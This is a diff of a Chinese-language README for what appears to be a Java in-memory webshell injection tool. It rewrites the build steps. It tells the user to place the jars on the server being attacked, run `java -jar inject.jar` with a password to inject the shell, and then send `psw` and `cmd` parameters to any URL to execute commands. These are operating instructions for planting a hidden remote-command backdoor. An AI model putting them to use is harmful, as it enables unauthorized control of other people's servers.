@@ -27,10 +27,9 @@
 
 # 使用说明
 1. 克隆本项目。
-2. `cd inject`->`mvn clean package`
-3. `cd memshell_asm`->`mvn clean package`
-4. 将生成jar包统一放入待攻击的服务器中，运行`java -jar inject.jar [your_password]`，即可注入。
-5. 访问任意url，带上参数`psw=your_password&cmd=your_cmd`,即可执行命令。
+2. 运行mvn clean package
+3. 将生成jar包统一放入待攻击的服务器中，运行`java -jar inject.jar [your_password]`，即可注入。
+4. 访问任意url，带上参数`psw=your_password&cmd=your_cmd`,即可执行命令。
 # 测试案例
 运行`java -jar inject-1.0.jar x1001`
 ![java](./img/java.png)
